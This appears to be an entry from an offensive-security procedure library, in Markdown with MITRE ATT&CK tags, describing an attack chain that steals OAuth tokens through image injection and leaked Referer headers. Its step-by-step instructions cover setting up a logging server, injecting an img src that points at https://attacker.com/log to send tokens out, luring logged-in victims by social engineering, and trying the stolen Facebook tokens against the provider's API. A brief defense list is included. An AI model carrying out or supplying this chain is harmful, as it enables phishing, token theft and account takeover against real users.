---
id: proc-uuid-2
name: Construct-Attack-Chain-for-OAuth-Token-Theft
tags:
  - oauth-theft
  - phishing
  - information-disclosure
  - referer-header
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:24:35.105Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Construct-Attack-Chain-for-OAuth-Token-Theft

## Summary

This procedure constructs an exploit chain leveraging image injection to manipulate the Referer header, enabling the theft of sensitive user tokens such as Facebook OAuth tokens through phishing or direct leakage when victims access the vulnerable page.

## Description

Once the image injection is confirmed, attackers can craft payloads that, when loaded by authenticated users, send Referer headers containing session data or OAuth tokens to attacker-controlled servers. This targets users logged in with social logins on the site, leading to account takeover or data exfiltration. The attack relies on the site's integration with OAuth providers like Facebook.

## Requirements

1. Control of an external server to receive leaked data
2. Knowledge of the target's OAuth integrations (e.g., Facebook)
3. Victim access to the vulnerable page while authenticated

## Defense

Defensive measures and detection strategies:

- Enforce Referer-Policy headers to restrict Referer transmission
- Sanitize all user-controlled inputs in image attributes
- Implement token binding and short-lived OAuth tokens
- Log and alert on suspicious Referer patterns

## Objectives

1. Inject malicious URLs to capture tokens in Referer headers
2. Facilitate phishing by luring users to credential-harvesting sites
3. Achieve information disclosure of sensitive user data

## Instructions

### Step 1: Prepare Malicious Endpoint

**Context**: Set up a server to log incoming Referer headers from injected images.

Host a simple logging server on a public URL (e.g., using Python Flask or ngrok-tunneled endpoint) to capture HTTP requests.

> Ensure the server logs the full Referer header, which may include appended query parameters with tokens.

### Step 2: Inject Malicious Image URL

**Context**: Embed the attacker URL in the image src via the vulnerability.

Using the injection point from Step 1 of the prior procedure, set img src to https://attacker.com/log?data=phish, where the Referer will carry the full path including any leaked tokens.

> Test by loading the page; check server logs for Referer containing site-specific data.

### Step 3: Chain to Token Theft

**Context**: Target authenticated users to capture OAuth tokens in the Referer.

Distribute the vulnerable page link to potential victims (e.g., via social engineering). When a logged-in user loads it, the Referer to the attacker server includes Facebook OAuth tokens if the site uses them for login.

> Validate by decoding captured tokens and attempting access to the OAuth provider's API.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[oauth-theft]]
- [[Phishing]]
